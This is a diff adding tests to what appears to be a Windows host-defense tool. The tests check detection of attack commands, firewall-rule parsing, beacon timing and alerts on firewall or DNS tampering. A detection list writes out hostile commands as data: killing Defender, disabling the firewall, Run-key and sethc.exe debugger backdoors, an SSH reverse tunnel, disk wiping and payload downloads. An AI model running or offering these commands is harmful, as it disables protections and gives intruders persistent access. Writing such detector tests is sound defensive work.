@@ -1182,3 +1182,74 @@ def test_file_guard_end_to_end(ctx, tmp_path, monkeypatch):
         time.sleep(0.2)
     assert not target.exists() and ctx.quarantine.items()
     ctx.shutdown()
+
+
+# ---------------------------------------------------------------- v1.6 defenses
+def test_new_attack_commands_are_caught():
+    j = G.judge_process
+    caught = [
+        ("msiexec.exe", 'msiexec /i "https://cdn.example.net/update.msi" /qn'),
+        ("finger.exe", "finger verify@203.0.113.9"),
+        ("bcdedit.exe", "bcdedit /set {default} safeboot minimal"),
+        ("taskkill.exe", "taskkill /f /im MsMpEng.exe"),
+        ("powershell.exe", "powershell Set-NetFirewallProfile -Profile Public -Enabled False"),
+        ("netsh.exe", r'netsh advfirewall firewall add rule name=x dir=in action=allow program="C:\Users\a\AppData\Roaming\x.exe"'),
+        ("netsh.exe", "netsh interface portproxy add v4tov4 listenport=8080 connectport=3389 connectaddress=10.0.0.5"),
+        ("reg.exe", r'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v up /d "C:\Users\a\AppData\Local\Temp\u.exe"'),
+        ("reg.exe", r'reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /d cmd.exe'),
+        ("ssh.exe", "ssh -R 9000:localhost:3389 user@203.0.113.9"),
+        ("cipher.exe", r"cipher /w:C:\\"),
+        ("curl.exe", r"curl https://x.example/a.exe -o %TEMP%\a.exe"),
+    ]
+    for name, cmd in caught:
+        assert j(name, "", cmd, "explorer.exe"), (name, cmd)
+    # everyday use stays quiet
+    quiet = [
+        ("msiexec.exe", r"msiexec /i C:\Users\a\Downloads\setup.msi"),
+        ("taskkill.exe", "taskkill /im notepad.exe"),
+        ("bcdedit.exe", "bcdedit /enum"),
+        ("ssh.exe", "ssh user@example.com"),
+        ("curl.exe", "curl https://example.com -o page.html"),
+        ("netsh.exe", "netsh wlan show profiles"),
+    ]
+    for name, cmd in quiet:
+        assert not j(name, "", cmd, "explorer.exe"), (name, cmd)
+
+
+def test_firewall_rule_parsing():
+    r = G.parse_rule(r"v2.30|Action=Allow|Active=TRUE|Dir=In|Protocol=6|LPort=4444|App=%USERPROFILE%\x.exe|Name=Updater|")
+    assert r["action"] == "Allow" and r["dir"] == "In" and r["lport"] == "4444" and r["name"] == "Updater"
+    assert r["app"].endswith(r"\x.exe")
+    assert G.parse_rule("garbage") == {}
+
+
+def test_beacon_finds_a_timer_and_ignores_people():
+    timer = [1000 + 60 * i + (0.8 if i % 2 else -0.6) for i in range(8)]
+    assert 55 < G.beacon(timer) < 65
+    human = [1000, 1013, 1100, 1180, 1500, 1520, 1990, 2100]
+    assert G.beacon(human) is None
+    assert G.beacon(timer[:4]) is None                      # too few to tell
+    assert G.beacon([1000 + 2 * i for i in range(10)]) is None   # a fast burst is a download, not a check-in
+
+
+def test_firewall_guard_alerts_on_new_hole_and_dns(ctx, monkeypatch, tmp_path):
+    monkeypatch.setattr(G, "DATA", tmp_path)
+    fw = G.FirewallGuard(ctx)
+    fw.setup()
+    state = {"rules": {"a": "v2.30|Action=Allow|Active=TRUE|Dir=Out|App=C:\\Windows\\x.exe|Name=old|"}, "dns": {}, "off": []}
+    monkeypatch.setattr(fw, "profiles_off", lambda: list(state["off"]))
+    monkeypatch.setattr(fw, "dns", lambda: dict(state["dns"]))
+    monkeypatch.setattr(G.FirewallGuard, "rules", lambda self: {n: (v if n in self.base.get("rules", {}) else ("h", v)) for n, v in state["rules"].items()})
+    monkeypatch.setattr(fw, "signed", lambda exe: False)
+    monkeypatch.setattr(ctx, "examine", lambda *a, **k: None, raising=False)
+    fw.slow_checks()                                        # first look: baseline only
+    before = len(ctx.log.latest(500, G.LOW))
+    evil = str(Path.home() / "AppData" / "Roaming" / "svc" / "svc.exe")
+    state["rules"]["b"] = f"v2.30|Action=Allow|Active=TRUE|Dir=In|App={evil}|Name=Windows Update Helper|"
+    state["dns"] = {"{nic}": "203.0.113.53"}
+    state["off"] = ["public"]
+    fw.slow_checks()
+    titles = [r[4] for r in ctx.log.latest(500, G.LOW)][: len(ctx.log.latest(500, G.LOW)) - before]
+    assert any("firewall opening" in t for t in titles)
+    assert any("DNS servers were changed" in t for t in titles)
+    assert any("Firewall is off for public" in t for t in titles)
